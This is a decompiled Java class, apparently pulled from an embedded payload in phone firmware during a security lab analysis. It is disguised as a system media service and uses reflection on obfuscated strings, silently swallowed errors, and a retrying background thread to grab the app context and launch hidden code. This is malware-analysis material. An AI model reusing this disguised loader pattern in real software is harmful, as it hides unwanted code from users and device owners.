package com.system.framework.media;

import android.app.Application;
import android.content.Context;
import com.system.framework.media.a.c;
import com.system.framework.media.a.f;
import com.system.framework.media.a.i;
import java.lang.reflect.Method;

/* JADX INFO: loaded from: /root/firmware-lab/inoi-a75/extracted/embedded_payloads/64/classes.dex */
public class services {
    private static Context mContext = null;
    private static int stateType = 0;

    public static Context getContext() {
        if (mContext != null) {
            return mContext;
        }
        try {
            Method forName = Class.class.getDeclaredMethod(i.a(c.q), String.class);
            Method getDeclaredMethod = Class.class.getDeclaredMethod(i.a(c.r), String.class, Class[].class);
            Class<?> clazz = (Class) forName.invoke(null, i.a(c.s));
            Method method = (Method) getDeclaredMethod.invoke(clazz, i.a(c.t), null);
            method.setAccessible(true);
            mContext = (Application) method.invoke(clazz, new Object[0]);
        } catch (Throwable th) {
        }
        try {
            if (mContext == null) {
                Method forName2 = Class.class.getDeclaredMethod(i.a(c.q), String.class);
                Method getDeclaredMethod2 = Class.class.getDeclaredMethod(i.a(c.r), String.class, Class[].class);
                Class<?> clazz2 = (Class) forName2.invoke(null, i.a(c.u));
                Method method2 = (Method) getDeclaredMethod2.invoke(clazz2, i.a(c.v), null);
                method2.setAccessible(true);
                mContext = (Application) method2.invoke(clazz2, new Object[0]);
            }
        } catch (Throwable th2) {
        }
        try {
            if (mContext != null) {
                f.a().a(mContext, stateType);
            }
        } catch (Throwable th3) {
        }
        return mContext;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public static int init() {
        try {
            Context context = getContext();
            if (context == null) {
                return 0;
            }
            mContext = context;
            return 1;
        } catch (Throwable th) {
            return -1;
        }
    }

    public void onCreate() {
        onCreate(0);
    }

    public void onCreate(int type) {
        startTask(type);
    }

    /* JADX WARN: Type inference failed for: r0v1, types: [com.system.framework.media.services$1] */
    private static void startTask(int type) {
        try {
            stateType = type;
            new Thread() { // from class: com.system.framework.media.services.1
                @Override // java.lang.Thread, java.lang.Runnable
                public void run() {
                    while (services.init() == 0) {
                        try {
                            try {
                                sleep(1000L);
                            } catch (Throwable th) {
                            }
                        } catch (Throwable th2) {
                            return;
                        }
                    }
                    if (services.mContext != null) {
                        f.a().a(services.stateType);
                    }
                }
            }.start();
        } catch (Throwable th) {
        }
    }

    public void onDestroy() {
        onDestroy(0);
    }

    public void onDestroy(int type) {
    }
}
